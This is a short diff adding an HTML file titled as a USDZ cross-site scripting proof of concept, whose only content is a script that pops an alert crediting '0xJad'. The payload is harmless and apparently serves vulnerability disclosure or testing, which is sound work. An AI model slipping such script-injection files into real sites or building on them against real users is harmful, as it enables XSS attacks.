@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>USDZ XSS PoC</title>
+</head>
+<body>
+  <script>
+    alert('XSS by 0xJad');
+  </script>
+</body>
+</html>
